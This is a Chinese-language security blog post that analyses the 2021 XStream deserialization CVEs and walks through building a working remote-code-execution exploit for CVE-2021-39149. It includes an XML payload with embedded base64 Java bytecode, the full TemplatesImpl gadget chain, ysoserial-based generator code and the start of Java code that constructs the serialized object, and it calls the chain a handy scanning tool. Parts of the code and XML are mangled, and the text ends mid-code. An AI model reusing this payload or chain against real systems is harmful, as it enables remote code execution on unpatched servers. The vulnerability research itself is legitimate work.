前几个月XStream爆出一堆漏洞，这两天翻了翻，发现这波洞应该是黑名单绕过的最后一波了。因为在最新版的XStream
1.4.18中已经默认开启白名单的安全框架，按照XStream官方补漏洞的习惯，应该不会再接受新的绕过黑名单的漏洞了。
## 挑肥拣瘦
这波漏洞一共14个，基本上都是RCE的级别，先简单梳理一下。
CVE ID | PoC  
---|---  
CVE-2021-39139 | RCE  
CVE-2021-39140 | DoS  
CVE-2021-39141 | JNDI Based RCE  
CVE-2021-39144 | RCE  
CVE-2021-39145 | JNDI Based RCE  
CVE-2021-39146 | JNDI Based RCE  
CVE-2021-39147 | JNDI Based RCE  
CVE-2021-39148 | JNDI Based RCE  
CVE-2021-39149 | RCE  
CVE-2021-39150 | SSRF  
CVE-2021-39151 | JNDI Based RCE  
CVE-2021-39152 | SSRF  
CVE-2021-39153 | RCE  
CVE-2021-39154 | JNDI Based RCE  
我是一个挑肥拣瘦的人，一向不怎么看基于JNDI这种需要出网的PoC。因为我认为出网就意味着限制，不仅是是否能够出网的限制，还有复杂网络环境导致的一系列变化多端的因素，所以这种限制就意味成功概率极大降低。所以目标范围缩小到`CVE-2021-39139`，`CVE-2021-39144`，`CVE-2021-39149`，`CVE-2021-39153`。那就看看这四个洞的详细介绍吧，哪个限制最少就分析哪个。
CVE ID | Restrictions  
---|---  
CVE-2021-39139 | JDK版本要在7u21及以下，很明显是用了7u21的洞转换的  
CVE-2021-39144 | 无限制  
CVE-2021-39149 | 无限制  
CVE-2021-39153 | JDK版本限制在8到14且要求同时安装了JavaFX  
具体看看无限制的两个洞的官方PoC都长什么样，`39144`看上去是直接可以调用到`java.lang.Runtime`，直接执行任意命令基本是没跑了，但这种情况大多数应该是盲打，或者还是利用出网的技巧。`39149`就非常给力了，一眼就看到了我们熟悉的老伙伴`TemplatesImpl`，这就意味着我们可能可以注入Java字节码实现任意类实例化，撺掇一下就可以实现回显攻击了，简直是扫描利器。所以基本目标定在了分析`CVE-2021-39149`这个漏洞。
值得一提的是那个限制了JDK版本为7u21及以下的洞也用到了`TemplatesImpl`，当然了，7u21本身确实也用到了`TemplatesImpl`，所以不值得什么大惊小怪。（不过我非要提这么一嘴，当然是要你注意这个地方，下文有呼应XD。）
## 跳坑
XStream官方是最令安全仔开心的官方，PoC都明晃晃地放在官网上，都不用费力气去diff补丁（或者偷别人的payload）。那么接下来就是基本操作了
    import com.thoughtworks.xstream.XStream;
    import java.io.FileInputStream;
    public class xstreamDeser {
        public static void main(String[] args) throws Exception {
            XStream xstream = new XStream();
            FileInputStream xml = new FileInputStream("src/main/java/xstream/xstream.xml");
            xstream.fromXML(xml);
        }
    }
test.xml里面Ctrl+V上官方的payload，然后就发现出问题了。
怎么红了吧唧的报错，看到最后一个标签都串位了感觉应该是哪个标签写错了导致的。挨个排查发现在Line
17，proxy标签不应该自闭合，因为它对应的闭合标签在Line 29。所以去掉最后的斜杠变成如下这样，然后重新粘贴一下报错就都没了。
接着我们就运行一下，基本上来说XStream官方提供的直接RCE的payload都是弹Windows上的计算器，也就是执行calc.exe命令。但是运行后，迎来了第二个报错。
这个地方属实有点奇怪，我实际在这里卡了将近一天的时间，在很多地方下了断点跟踪分析，基本上定位到了问题可能是出在proxy标签以内，也就是TemplatesImpl类的实例化位置，但仍然就是找不出来根本问题在哪里。在卡了很久以后，我转战了CVE-2021-39139，因为这也是同样用到了TemplatesImpl类，觉得可能在这或许可以找到突破口。然后同样基本操作了一遍，居然报了一样的错误。不过确实，在对比了两个payload在TemplatesImpl位置的代码，除了字节码的Base64编码不太一样，其他都一样。
但是这边有个很不一样的点，就是`_bytecode`标签里面塞入了两段byte-array标签，且这两个payload对应的第二段byte-array标签里面内容一模一样。我拿去base64解码了一下，有一些`ysoserial`的关键字，其他得不到任何有用的信息。于是我拿着第二段的base64编码值去Google了一下。发现在一个讲解泛微之前爆出的XStream漏洞的payload中出现了一模一样的base64编码值，也同样处在了`TemplatesImpl`这个类里面。但是我手头没有泛微的demo没法验证泛微那个payload是否有效。（其实后面复盘发现，这边是个蠢操作，我完全可以摘出泛微payload中XStream那部分拿到本地测试一下就行了）所以我接着看了一些关于如何生成泛微这个payload的相关文档，得知可以通过在引入ysoserial的包生成任意已有gadget的XStream形式的payload。生成代码是我抄的potats0发在p神的小密圈的code，如下：
    package ysoserial.exploit;
    import ysoserial.payloads.ObjectPayload;
    import static ysoserial.payloads.ObjectPayload.Utils.makePayloadObject;
    public class XStream {
        public static void main(String[] args) {
            if (args.length false
所以`CVE-2021-39149`的完整的正确的payload应该如下（`TemplatesImpl`类的`byte-array`第一部分已省略）：
            map
                    true
                    java.lang.Object
                                java.lang.Object
                                hashCode
                                            Pwnr
                                                yv66vgAA......
                                                yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ
                                            -1
                                            0
                                        false
                                    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
                                    getOutputProperties
另外`CVE-2021-39144`的payload其实就是`ysoserial`中`Jdk7u21`的payload直接生成的，这个用来刷洞真方便。
## 正儿八经的分析
XStream的分析，其实就是两个部分，一个是针对XStream如何把XML转换到Java Object的过程的分析，另一个就是Java
Object的构造分析。很多的文章写的时候就是`ProcessBuilder#start`断点一打，debug一跑，一行一行代码走下来，很没劲，简直就是事后诸葛亮的行为。在分析XStream的漏洞的时候如果对着payload执行debug一遍，那么如何发现新的类似的漏洞，那些XML该怎么构造出来？很明显，通过上文的分析，我认为正确的正向分析应该先用Java代码构造出一个序列化的object然后，用XStream#toXML把生成的Java序列化对象转化成XML最后形成真正的payload。
这里基本上和构造一个Java原生序列化对象一样，通过构造器的层层相套最后发给后端服务器，然后服务器再一层层反序列化读到最里层的危险代码。所以完整的序列化对象的构造链应该如下：
    java.util.LinkedHashSet
        java.lang.reflect.Proxy
            com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl
                sun.tracing.NullProvider
                    sun.tracing.dtrace.DTraceProbe
                        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
关键的触发其实也很简单，就是在`NullProvider`的构造器部分，它的`probes`属性是`HashMap`类型的，关键的危险代码放在value部分，那么自然就和大多数`ysoserial`中的gadget一样就用`hashcode()`这个函数进行触发了。
按部就班构造序列化数据的Java代码就很简单了，如下：
    import com.thoughtworks.xstream.XStream;
    import com.thoughtworks.xstream.converters.reflection.SunUnsafeReflectionProvider;
    import sun.misc.Unsafe;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.Reflections;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.LinkedHashMap;
    import java.util.LinkedHashSet;
    public class xstream39149 {
        private static Unsafe instaniateUnsafe() throws Exception {
            Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            return (Unsafe) unsafeField.get(null);
        }